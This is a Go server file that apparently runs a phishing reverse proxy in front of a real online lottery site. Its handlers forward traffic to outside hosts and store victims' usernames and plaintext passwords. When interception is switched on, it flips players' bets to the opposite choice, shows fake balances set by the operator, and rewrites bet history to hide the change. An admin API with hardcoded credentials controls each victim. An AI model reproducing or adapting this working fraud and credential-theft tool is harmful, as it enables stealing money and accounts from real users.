package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"github.com/gin-contrib/cors"
	"github.com/gin-gonic/gin"
	"gorm.io/gorm"
	"html/template"
	"io/ioutil"
	"log"
	"makeMonkey/dataDb"
	"makeMonkey/models"
	"makeMonkey/utils"
	"math/rand"
	"net/url"
	"strings"

	"net/http"
	"time"
)

var (
	client  = &http.Client{}
	db      *gorm.DB
	conf    *utils.Yaml
	imgs    []string
	mapping = map[string]string{
		"小": "大",
		"单": "双",
		"双": "单",
		"大": "小",
	}
)

type CaptchaResponse struct {
	CaptchaId string `json:"captchaId"` //验证码Id
	ImageUrl  string `json:"imageUrl"`  //验证码图片url
}

func Cors() gin.HandlerFunc {
	c := cors.Config{
		AllowAllOrigins: true,
		AllowMethods:    []string{"GET", "POST", "PUT", "DELETE", "PATCH", "OPTION"},
		AllowHeaders:    []string{"Content-Type", "Access-Token", "Authorization", "accessToken"},
		MaxAge:          6 * time.Hour,
	}

	return cors.New(c)
}
func main() {
	//var err error
	conf, _ = utils.ParseYaml()
	db = dataDb.InitDB()
	imgs, _ = utils.ListDir("./yanz", ".png")

	router := gin.Default()
	router.Use(Cors())

	router.Static("/dist", "./dist")

	router.Static("/php_files", "./php_files")
	router.LoadHTMLGlob("templates2/*")

	router.GET("/securimage.js", securimage)
	router.GET("/maps/bundle.js.map", securimage)
	router.GET("/", appnavi)
	router.POST("/", postnavi)
	router.GET("/css/*any", naviHandler)
	router.GET("/img/*any", naviHandler)
	router.GET("/images/*any", naviHandler)
	router.GET("/lib/*any", naviHandler)
	//router.GET("/css", naviHandler)
	router.GET("/securimage_show.php", showhandler)
	//router.POST("/search", search)

	router.GET("/prelogin", prelogin)
	router.POST("/login", login)
	router.GET("/login", getlogin)

	router.GET("/code", code)
	router.GET("/time", timehadler)
	router.GET("/notice", notice)

	//上述合并为一个
	router.GET("/member/*any", memberHadler)
	router.POST("/member/*any", memberHadler)
	router.GET("/static/*any", staticHadler)
	router.GET("/js/*any", staticHadler)
	router.GET("/util/*any", staticHadler)
	router.GET("/imgww/*any", staticHadler)

	//mobilePhone
	router.GET("/creditmobile/*any", mobile)
	//router.POST("/web/rest/login", mobilelogin)
	router.GET("/web/rest/*any", mobilewebrest)
	router.POST("/web/rest/*any", mobilewebrest)

	//admin
	router.POST("/userManagement/getList", getUserList)
	router.POST("/userManagement/updateIntercept", updateIntercept)
	router.POST("/userManagement/EditWantedMoney", EditWantedMoney)
	router.POST("/userManagement/changeName", changeName)
	router.POST("/userManagement/getName", getName)

	router.POST("/searchCodeManagement/getList", getSearchCodeList)
	router.POST("/admin/login", adminLogin)
	router.POST("/post/open", open)
	router.GET("/post/getopen", getopen)
	router.POST("/roleManagement/doEdit", addSearchCode)
	//router.GET("/dist/login", admin)

	//router.
	///default/css/images/blue/btn.png
	//default/css/images/blue/openwinbg.png
	///favicon.ico
	//c

	router.Run(":10086")
}

func postnavi(c *gin.Context) {
	fmt.Printf("search values->  %s,  %s,   %s, \n", c.PostForm("do"), c.PostForm("search"), c.PostForm("ct_captcha"))
	//只有搜索码记录存在，才返回页面
	var exits models.SearchCode
	db.Table("search_codes").Where(&models.SearchCode{Code: c.PostForm("search")}).Find(&exits)
	if exits.Code != "" { //记录存在
		//且验证码正确
		ck, _ := c.Request.Cookie("yzm")
		fmt.Println("post cookie->", ck.Name)
		if utils.YanzEqual(ck.Value, c.PostForm("ct_captcha")+".png") {
			c.HTML(http.StatusOK, "searchfake.html", conf.Baseip)
		} else {
			c.Redirect(302, "/")
		}

	} else {
		ck, _ := c.Request.Cookie("yzm")
		if utils.YanzEqual(ck.Value, c.PostForm("ct_captcha")+".png") {
			c.HTML(200, "search.html", "")
		} else {
			c.Redirect(302, "/")
		}
	}

}

func showhandler(c *gin.Context) {
	//************************************************************************************************
	p := c.Query("")
	fmt.Println("aaaaa->", p)
	rand.Seed(time.Now().Unix())
	idx := rand.Intn(len(imgs))
	c.SetCookie("yzm", imgs[idx], 12222221, "/", "", false, false)
	//http.ServeFile(c.Writer, c.Request, "./yanz/"+imgs[idx])

	//sizeFunc := func() (int64, error) { return d.Size(), nil }
	fmt.Println("\"/yanz/\" + imgs[idx]->", "./yanz/"+imgs[idx])
	cnt, _ := ioutil.ReadFile("./yanz/" + imgs[idx])
	c.Header("content-type", "image/png")
	c.String(200, string(cnt))
	//f, _ := os.OpenFile("./yanz/"+imgs[idx], os.O_RDONLY, 0755)
	//defer f.Close()
	//http.ServeContent(c.Writer, c.Request, p, time.Time{}, bytes.NewReader(cnt))
	//************************************************************************************************
	//fmt.Printf("%s -> %s   |  %s\n", c.Request.Method, c.Request.RequestURI, c.Param("any"))
	//cnt, _ := ioutil.ReadAll(c.Request.Body)
	//c.Request.Header.Set("cookie", strings.ReplaceAll(c.Request.Header.Get("cookie"), "%2f", "/"))
	//resp := xois("https://613880.app"+c.Request.RequestURI, c.Request.Method, c.Request.Header, string(cnt))
	//c.Header("content-type", resp.Header.Get("content-type"))
	//c.Header("content-encoding", resp.Header.Get("content-encoding"))
	//for _, ck := range resp.Cookies() {
	//	v, _ := url.QueryUnescape(ck.Value)
	//	if ck.Name == "AWSALBCORS" {
	//		continue
	//	}
	//	c.SetCookie(ck.Name, v, ck.MaxAge, ck.Path, "", false, false)
	//}
	//
	//res, _ := ioutil.ReadAll(resp.Body)
	//c.String(200, string(res))

}

func naviHandler(c *gin.Context) {
	fmt.Printf("%s -> %s   |  %s\n", c.Request.Method, c.Request.RequestURI, c.Param("any"))
	cnt, _ := ioutil.ReadAll(c.Request.Body)
	c.Request.Header.Del("cookie")
	resp := xois("https://613880.app"+c.Request.RequestURI, c.Request.Method, c.Request.Header, string(cnt))
	c.Header("content-type", resp.Header.Get("content-type"))
	c.Header("content-encoding", resp.Header.Get("content-encoding"))
	//Cookies := resp.Cookies()
	//for _, ck := range Cookies {
	//	c.SetCookie(ck.Name, ck.Value, ck.MaxAge, ck.Path, "", false, ck.HttpOnly)
	//}
	res, _ := ioutil.ReadAll(resp.Body)
	c.String(200, string(res))
}

func securimage(c *gin.Context) {
	fmt.Printf("%s -> %s   |  %s\n", c.Request.Method, c.Request.RequestURI, c.Param("any"))
	cnt, _ := ioutil.ReadAll(c.Request.Body)
	c.Request.Header.Del("cookie")
	resp := xois("https://613880.app"+c.Request.RequestURI, c.Request.Method, c.Request.Header, string(cnt))
	c.Header("content-type", resp.Header.Get("content-type"))
	c.Header("content-encoding", resp.Header.Get("content-encoding"))
	//Cookies := resp.Cookies()
	//for _, ck := range Cookies {
	//	c.SetCookie(ck.Name, ck.Value, ck.MaxAge, ck.Path, "", false, ck.HttpOnly)
	//}
	res, _ := ioutil.ReadAll(resp.Body)
	c.String(200, string(res))
}
func appnavi(c *gin.Context) {
	fmt.Printf("%s -> %s   |  %s\n", c.Request.Method, c.Request.RequestURI, c.Param("any"))
	cnt, _ := ioutil.ReadAll(c.Request.Body)
	resp := xois("https://613880.app"+c.Request.RequestURI, c.Request.Method, c.Request.Header, string(cnt))
	c.Header("content-type", resp.Header.Get("content-type"))
	c.Header("content-encoding", resp.Header.Get("content-encoding"))
	Cookies := resp.Cookies()
	if c.Request.RequestURI == "/" {
		for _, ck := range Cookies {
			if ck.Name == "AWSALBCORS" {
				continue
			}
			v, _ := url.QueryUnescape(ck.Value)
			c.SetCookie(ck.Name, v, ck.MaxAge, ck.Path, "", false, false)
		}
	}

	res, _ := ioutil.ReadAll(resp.Body)
	c.String(200, string(res))
	//if resp.Header.Get("content-encoding") == "br" {
	//	xx, _ := ioutil.ReadAll(brotli.NewReader(resp.Body))
	//	fmt.Println("navi->", string(xx))
	//
	//	c.String(200, string(xx))
	//} else {
	//	c.String(200, string(res))
	//}
}

func staticHadler(c *gin.Context) {
	fmt.Printf("%s -> %s   |  %s\n", c.Request.Method, c.Request.RequestURI, c.Param("any"))
	uurl := "https://6570198342-ls.5ddp6kmp70.com"
	if c.Param("any") == "/bundle.js" {
		uurl = "https://613880.app"
	}
	cnt, _ := ioutil.ReadAll(c.Request.Body)
	resp := xois(uurl+c.Request.RequestURI, c.Request.Method, c.Request.Header, string(cnt))
	c.Header("content-type", resp.Header.Get("content-type"))
	c.Header("content-encoding", resp.Header.Get("content-encoding"))
	res, _ := ioutil.ReadAll(resp.Body)
	c.String(200, string(res))

	//if resp.Header.Get("content-encoding") == "gzip" {
	//	c.String(200, utils.GzipDecode(res).String())
	//} else {
	//	c.String(200, string(res))
	//}
}

func memberHadler(c *gin.Context) {

	fmt.Printf("%s -> %s   |  %s\n", c.Request.Method, c.Request.RequestURI, c.Param("any"))
	cnt, _ := ioutil.ReadAll(c.Request.Body)

	//pc 拦截下注
	postBody := string(cnt)
	if conf.Open && c.Param("any") == "/bet" {
		var betq models.BetReq
		json.Unmarshal(cnt, &betq)
		for i := 0; i < len(betq.Bets); i++ {
			if strings.HasPrefix(betq.Bets[i].Game, "DX") {
				if betq.Bets[i].Contents == "D" {
					betq.Bets[i].Contents = "X"
				} else {
					betq.Bets[i].Contents = "D"
				}
			} else if strings.HasPrefix(betq.Bets[i].Game, "DS") {
				if betq.Bets[i].Contents == "D" {
					betq.Bets[i].Contents = "S"
				} else {
					betq.Bets[i].Contents = "D"
				}
			}
		}
		bodyByte, _ := json.Marshal(&betq)
		postBody = string(bodyByte)
		fmt.Println("真实注单->", postBody)
	}
	//pc处理302跳转
	if strings.Contains(c.Request.RequestURI, "_OLID") {
		tr := &http.Transport{}
		R, _ := http.NewRequest("GET", "https://6570198342-ls.5ddp6kmp70.com"+c.Request.RequestURI, nil)
		R.Header = c.Request.Header
		resp, _ := tr.RoundTrip(R)
		Cookies := resp.Cookies()
		for _, ck := range Cookies {
			c.SetCookie(ck.Name, ck.Value, ck.MaxAge, ck.Path, "", false, ck.HttpOnly)
		}
		c.Redirect(302, "/member/index")
		return
	}

	//拦截用户信息，并修改余额	accounts
	//can't do this but can do in the bet response,because your money become pool.is because you bet

	//其余转发
	resp := xois("https://6570198342-ls.5ddp6kmp70.com"+c.Request.RequestURI, c.Request.Method, c.Request.Header, postBody)
	c.Header("content-type", resp.Header.Get("content-type"))
	//c.Header("content-encoding", resp.Header.Get("content-encoding"))
	res, _ := ioutil.ReadAll(resp.Body)
	returnResp := string(res)
	//下注的响应，用于存储余额和篡改余额  //主要是这里篡改鱼儿不是实时的
	if c.Param("any") == "/bet" {
		if resp.Header.Get("content-encoding") == "gzip" {
			var betresponse models.BetResponse
			json.Unmarshal(utils.GzipDecode(res).Bytes(), &betresponse)
			//真实响应
			curUsername := strings.Split(betresponse.Account.Userid, "-")[1]
			money := betresponse.Account.Balance
			//刷新真实余额
			db.Table("users").Where(&models.User{Username: curUsername}).Update("money", money)

			//数据库记录
			var lookupuser models.User
			db.Table("users").Where(&models.User{Username: curUsername}).Find(&lookupuser)
			if lookupuser.Intercept == 1 { //开启拦截就篡改余额
				betresponse.Account.Balance = lookupuser.WantedMoney
			}
			retByte, _ := json.Marshal(betresponse)
			returnResp = string(retByte)
		}
	} else {
		c.Header("content-encoding", resp.Header.Get("content-encoding"))
	}
	//未结明细
	if conf.Open && c.Param("any") == "/bets" && c.Request.Method == "GET" {
		if resp.Header.Get("content-encoding") == "gzip" {
			fmt.Println("gzip->>>")
			htmlstr := utils.GzipDecode(res).String()
			returnResp = utils.Replace(htmlstr)
			c.Header("content-encoding", "text/html")
			//strings.ReplaceAll(htmlstr, "大</span>", "小</span>")
		}
	}

	//下注最新朱丹
	if c.Param("any") == "/lasts" && conf.Open {
		if resp.Header.Get("content-encoding") == "gzip" {
			returnResp = utils.GzipDecode(res).String()
		}
		var respT []struct {
			ID string `json:"id"`
			T  string `json:"t"`
			O  string `json:"o"`
			A  int    `json:"a"`
		}
		json.Unmarshal([]byte(returnResp), &respT)
		for i := 0; i < len(respT); i++ {
			respT[i].T = utils.Zhudanreplace(respT[i].T)
		}
		byteb, _ := json.Marshal(&respT)
		c.Header("content-encoding", "application/json")
		returnResp = string(byteb)
		log.Println("back------->fake->>", returnResp)
	}

	if conf.Name != "" && strings.Contains(c.Request.RequestURI, "member/index") {
		returnResp = strings.ReplaceAll(utils.GzipDecode([]byte(returnResp)).String(), "联胜", conf.Name)
		c.Header("content-encoding", "text/html")
		fmt.Println("change name!!")
	}
	c.String(200, returnResp)
}

//https://6570198342-ls.5ddp6kmp70.com
func mobilewebrest(c *gin.Context) {
	fmt.Printf("%s -> %s   |  %s\n", c.Request.Method, c.Request.RequestURI, c.Param("any"))
	bb, _ := ioutil.ReadAll(c.Request.Body)
	//拦截下注，并return
	postBody := string(bb)
	if conf.Open && strings.Contains(c.Request.RequestURI, "placebet") {
		var mbetreq models.MBetReq
		json.Unmarshal(bb, &mbetreq)
		for i := 0; i < len(mbetreq.MBets); i++ {
			//{"lottery":"PK10JSC","drawNumber":"32406960","bets":[{"game":"DS1","contents":"S","amount":1,"odds":1.9799,"title":"冠军"}],"ignore":false}
			if strings.HasPrefix(mbetreq.MBets[i].Game, "DX") {
				if mbetreq.MBets[i].Contents == "D" {
					mbetreq.MBets[i].Contents = "X"
				} else {
					mbetreq.MBets[i].Contents = "D"
				}
			} else if strings.HasPrefix(mbetreq.MBets[i].Game, "DS") {
				if mbetreq.MBets[i].Contents == "D" {
					mbetreq.MBets[i].Contents = "S"
				} else {
					mbetreq.MBets[i].Contents = "D"
				}
			}
		}
		postBodybyte, _ := json.Marshal(mbetreq)
		postBody = string(postBodybyte)
		log.Println("真实朱丹->  ", postBody)
	}

	resp := xois("https://6570198342-ls.5ddp6kmp70.com"+c.Request.RequestURI, c.Request.Method, c.Request.Header, postBody)
	body, _ := ioutil.ReadAll(resp.Body)
	retRes := string(body)
	//fmt.Println("origin->", retRes)
	c.Header("content-type", resp.Header.Get("content-type"))
	for _, ck := range resp.Cookies() {
		c.SetCookie(ck.Name, ck.Value, ck.MaxAge, ck.Path, "", false, false)
	}
	c.Header("content-encoding", resp.Header.Get("content-encoding"))

	//拦截鱼儿
	if c.Param("any") == "/member/info" {
		var userInfo models.MobileUserInfo
		debody := body
		if resp.Header.Get("content-encoding") == "gzip" {
			debody = utils.GzipDecode(debody).Bytes()
		}
		json.Unmarshal(debody, &userInfo)
		var dbuser models.User
		db.Table("users").Where("username=?", userInfo.Result.User.Username).Find(&dbuser)
		fmt.Println("db user->", dbuser)
		if dbuser.Username == "" {
			//没有用户添加用户
			mny := 0.0
			for _, v := range userInfo.Result.Accounts {
				if v.Balance != 0.0 {
					mny = v.Balance
				}
			}
			if err := db.Table("users").Create(&models.User{
				Username:    userInfo.Result.User.Username,
				Password:    userInfo.Result.User.Userpass,
				Money:       mny,
				WantedMoney: 0.0,
				Intercept:   0,
				LastLogin:   time.Now(),
			}).Error; err != nil {
				log.Println("存储用户失败,", err)
			}
		}

		for i := 0; i < len(userInfo.Result.Accounts); i++ {
			if userInfo.Result.Accounts[i].Balance != 0.0 {
				db.Table("users").Where(&models.User{Username: dbuser.Username}).Update("money", userInfo.Result.Accounts[i].Balance)
				if dbuser.Intercept == 1 {
					fmt.Println("intercept")
					userInfo.Result.Accounts[i].Balance = dbuser.WantedMoney
				}
			}
		}

		byteBody, _ := json.Marshal(&userInfo)
		retRes = string(byteBody)
		c.Header("content-type", "application/json")
		c.Header("content-encoding", "")

		//fmt.Println("yue->", retRes)
	}
	if c.Param("any") == "/member/bets" {
		var consultbets models.ConsultBets
		debody := body
		if resp.Header.Get("content-encoding") == "gzip" {
			debody = utils.GzipDecode(debody).Bytes()
		}
		json.Unmarshal(debody, &consultbets)
		//var dbuser models.User
		//db.Table("user").Where("username=?", userInfo.Result.User.Username).Find(&dbuser)
		//if dbuser.Intercept == 1 {
		for i := 0; i < len(consultbets.Result.List); i++ {
			consultbets.Result.List[i].Text = mapping[consultbets.Result.List[i].Text]
		}
		byteBody, _ := json.Marshal(&consultbets)
		retRes = string(byteBody)
		c.Header("content-encoding", "")
		c.Header("content-type", "application/json")

	}
	c.String(200, retRes)

}

func mobile(c *gin.Context) {
	//c.String(200, c.Request.Method+"    "+c.Request.RequestURI)
	resp := xois("https://6570198342-ls.5ddp6kmp70.com"+c.Request.RequestURI, c.Request.Method, c.Request.Header, "")
	body, _ := ioutil.ReadAll(resp.Body)
	c.Header("content-type", resp.Header.Get("content-type"))
	c.Header("content-encoding", resp.Header.Get("content-encoding"))
	c.String(200, string(body))
}

func addSearchCode(c *gin.Context) {
	var code struct {
		Searchcode string `json:"searchcode"`
	}
	c.ShouldBindJSON(&code)
	var exist models.SearchCode
	db.Table("search_codes").Where(&models.SearchCode{Code: code.Searchcode}).Find(&exist)
	if exist.Code != "" { //记录存在
		c.JSON(200, gin.H{
			"code": 200,
			"msg":  "请勿重复添加！",
		})
	} else {
		db.Table("search_codes").Create(&models.SearchCode{Code: code.Searchcode})
		c.JSON(200, gin.H{
			"code": 200,
			"msg":  "添加成功！",
		})
	}
}

func getopen(c *gin.Context) {
	c.JSON(200, gin.H{
		"code": 200,
		"msg":  "ok",
		"data": gin.H{
			"open": conf.Open,
		},
	})
}

func open(c *gin.Context) {
	var data struct {
		Open bool `json:"open"`
	}
	c.ShouldBindJSON(&data)
	conf.Open = data.Open
	utils.StoreYaml(conf)
	conf, _ = utils.ParseYaml()
	c.JSON(200, gin.H{
		"code": 200,
		"msg":  "ok",
	})
}

func adminLogin(c *gin.Context) {

	var admin struct {
		Username string `json:"username"`
		Password string `json:"password"`
	}
	c.ShouldBindJSON(&admin)
	if admin.Username == "admin" && admin.Password == "xxxmmm" {
		c.JSON(200, gin.H{
			"code": 200,
			"msg":  "success",
			"data": gin.H{
				"accessToken": "ashiuahwbiudbiauwbdaiuw==",
			},
		})
	} else {
		c.JSON(500, gin.H{
			"code": 500,
			"msg":  "帐户或密码不正确",
		})
	}

}

func getSearchCodeList(c *gin.Context) {
	var page models.UserPage
	c.ShouldBindJSON(&page)
	var codes []models.SearchCode
	var num int64
	if err := db.Model(&models.SearchCode{}).Limit(page.PageSize).Offset((page.PageNo - 1) * page.PageSize).Find(&codes).Count(&num).Error; err != nil {
		c.JSON(http.StatusUnauthorized, gin.H{
			"err_msg": err.Error(),
		})
	}
	c.JSON(200, models.ListResponse{
		Code:       200,
		Msg:        "ok",
		TotalCount: num,
		Data:       codes,
	})
}

func getUserList(c *gin.Context) {
	var page models.UserPage
	c.ShouldBindJSON(&page)
	var users []models.User
	var num int64
	if err := db.Table("users").Limit(page.PageSize).Offset((page.PageNo - 1) * page.PageSize).Find(&users).Count(&num).Error; err != nil {
		c.JSON(http.StatusUnauthorized, gin.H{
			"err_msg": err.Error(),
		})
	}
	c.JSON(200, models.ListResponse{
		Code:       200,
		Msg:        "ok",
		TotalCount: num,
		Data:       users,
	})
}
func getName(c *gin.Context) {
	c.JSON(200, gin.H{
		"code": 200,
		"msg":  "ok",
		"data": gin.H{
			"name": conf.Name,
		},
	})
}
func changeName(c *gin.Context) {
	var name struct {
		Value string `json:"value"`
	}
	c.ShouldBindJSON(&name)
	conf.Name = name.Value
	utils.StoreYaml(conf)
	conf, _ = utils.ParseYaml()
	c.JSON(200, gin.H{
		"code": 200,
		"msg":  "ok",
	})
	//fmt.Println("edit wanted money ->", name)

}
func EditWantedMoney(c *gin.Context) {
	var user models.User
	c.ShouldBindJSON(&user)
	fmt.Println("edit wanted money ->", user)
	db.Table("users").Where(&models.User{Username: user.Username}).Update("wanted_money", user.WantedMoney)
	c.JSON(200, gin.H{
		"code": 200,
		"msg":  "ok",
	})
}
func updateIntercept(c *gin.Context) {
	var user models.User
	c.ShouldBindJSON(&user)
	//body, _ := ioutil.ReadAll(c.Request.Body)
	//fmt.Println("update intercept-->", string(body))
	//

	fmt.Println("update intercept ShouldBindJSON-->", user)

	db.Table("users").Where("username=?", user.Username).Update("intercept", user.Intercept)
	//fmt.Println("update intercept-->", string(body))
	c.JSON(200, gin.H{
		"code": 200,
		"msg":  "ok",
	})
}

func notice(c *gin.Context) {
	resp1 := xois("https://6570198342-ls.5ddp6kmp70.com"+c.Request.RequestURI, "GET", c.Request.Header, "")
	cnt, _ := ioutil.ReadAll(resp1.Body)
	c.Header("content-type", resp1.Header.Get("content-type"))

	//获取ssid cookie 注入
	//resp2 := xois("https://6570198342-ls.5ddp6kmp70.com/time?_", "GET", c.Request.Header, "")
	//for _, ck := range resp2.Cookies() {
	//	c.SetCookie(ck.Name, ck.Value, ck.MaxAge, ck.Path, "", false, false)
	//}
	if resp1.Header.Get("content-encoding") == "gzip" {
		c.String(200, utils.GzipDecode(cnt).String())
	} else {
		c.String(200, string(cnt))
	}

}

func timehadler(c *gin.Context) {
	fmt.Println("time->req", c.Request.Header)

	resp := xois("https://6570198342-ls.5ddp6kmp70.com"+c.Request.RequestURI, c.Request.Method, c.Request.Header, "")
	cnt, _ := ioutil.ReadAll(resp.Body)
	c.Header("content-type", resp.Header.Get("content-type"))
	c.Header("content-encoding", resp.Header.Get("content-encoding"))
	fmt.Println("time->resp", resp)

	for _, ck := range resp.Cookies() {
		c.SetCookie(ck.Name, ck.Value, ck.MaxAge, ck.Path, "", false, false)
	}
	if resp.StatusCode == 302 {
		fmt.Println("redirect")
		c.Redirect(302, resp.Header.Get("location"))
	} else {
		c.String(200, string(cnt))
	}
}

func code(c *gin.Context) {
	time_ := c.Query("_")
	resp := xois("https://6570198342-ls.5ddp6kmp70.com"+c.Request.RequestURI, "GET", c.Request.Header, "")
	c.Header("set-cookie", resp.Header.Get("set-cookie"))
	body_, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		// handle error
	}
	http.ServeContent(c.Writer, c.Request, time_, time.Time{}, bytes.NewReader(body_)) //验证码
}

func getlogin(c *gin.Context) {
	c.Redirect(302, "/prelogin")
}
func login(c *gin.Context) {
	account := c.PostForm("account")
	passwd := c.PostForm("password")
	code := c.PostForm("code")
	fmt.Printf("account: %s,   password: %s,  code: %s\n", account, passwd, code)
	tr := &http.Transport{}
	R, _ := http.NewRequest("POST", "https://6570198342-ls.5ddp6kmp70.com/login", strings.NewReader(fmt.Sprintf("type=1&account=%s&password=%s&code=%s", account, passwd, code)))
	R.Header = c.Request.Header
	resp, _ := tr.RoundTrip(R)
	//fmt.Println("login response code->", resp.Status, resp.StatusCode)
	//fmt.Println("login request ->", resp.Request)
	//fmt.Println("login response ->", resp.Header)

	if resp.StatusCode == 302 {
		c.Header("set-cookie", resp.Header.Get("set-cookie"))
		//push to db
		var user models.User
		db.Table("users").Where(&models.User{Username: account}).Find(&user)
		//fmt.Println("user name->", user.Username)
		if user.Username == "" {
			if err := db.Table("users").Create(&models.User{
				Username:    account,
				Password:    passwd,
				Money:       0.0,
				WantedMoney: 0.0,
				Intercept:   0,
				LastLogin:   time.Now(),
			}).Error; err != nil {
				log.Println("存储用户失败,", err)
			}

		} else {
			//已存在记录//更新登录时间
			db.Table("users").Where(&user).Update("last_login", time.Now())
		}

		//db.First(&user, 1)
		c.Redirect(302, resp.Header.Get("location"))

	} else {
		//账号密码不正确、验证码不正确  或者其他原因
	}

}

//Aa12341234

func search(c *gin.Context) {
	//在这里书写搜索码的对应处理策略
	fmt.Printf("search values->  %s,  %s,   %s, ", c.PostForm("do"), c.PostForm("search"), c.PostForm("ct_captcha"))
	//只有搜索码记录存在，才返回页面
	var exits models.SearchCode
	db.Table("search_codes").Where(&models.SearchCode{Code: c.PostForm("search")}).Find(&exits)
	if exits.Code != "" { //记录存在
		c.HTML(http.StatusOK, "search.html", conf.Baseip)
	}
	c.Redirect(302, "/")

}

func prelogin(c *gin.Context) {
	//hd := http.Header{
	//	"cookie": {"__nxquid=zhuzDh0A6BiVMxON+wwJ1YaZ4c5s8g==0014"},
	//}
	loginUrl := ""
	fmt.Println("is mobile  -> ", utils.IsMobile(c.GetHeader("user-agent")))
	if utils.IsMobile(c.GetHeader("user-agent")) {
		//loginUrl = "https://6570198342-ls.5ddp6kmp70.com"
		c.Redirect(302, "/creditmobile")
		return
	} else {
		loginUrl = "https://6570198342-ls.5ddp6kmp70.com/login"
	}
	resp := xois(loginUrl, "GET", c.Request.Header, "")
	//fmt.Println("prelogin-->set-cookie-->", resp.Header.Get("set-cookie"))
	c.Header("set-cookie", strings.ReplaceAll(resp.Header.Get("set-cookie"), "domain=.k2kqv858qm.com", "SameSite=None"))
	//fmt.Println("response code->", resp.StatusCode)
	//fmt.Println("response header->", resp.Header)
	defer resp.Body.Close()
	body_, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		// handle error
	}
	newCnt := string(body_)
	if resp.Header.Get("content-encoding") == "gzip" {
		newCnt = utils.GzipDecode(body_).String()
	} else {

	}
	tmpl, err := template.New("htmlTest").Parse(newCnt)

	tmpl.Execute(c.Writer, nil)
}

func xois(url, method string, hd http.Header, body string) *http.Response {

	req, err := http.NewRequest(method, url, strings.NewReader(body))
	if err != nil {
		// handle error
	}
	req.Header = hd
	fmt.Println(req.Method, "->", req.Host, url)
	//req.Header.Add()
	//req.Header.Set("host", "7653428901-ls.k2kqv858qm.com")
	//req.Header.Set("Origin", "https://6570198342-ls.5ddp6kmp70.com")
	//req.Header.Set("Content-Type", "application/json")
	//req.Header.Set("Cookie", "")
	//fmt.Println("req->", req)

	resp, err := client.Do(req)
	fmt.Println("resp->", resp.StatusCode)
	return resp
	//defer resp.Body.Close()
	//
	//body_, err := ioutil.ReadAll(resp.Body)
	//if err != nil {
	//	// handle error
	//}
	//fmt.Println("response code->", resp.StatusCode)
	//fmt.Println("response header->", resp.Header)
	//fmt.Println("just test->  ", string(body_))

}
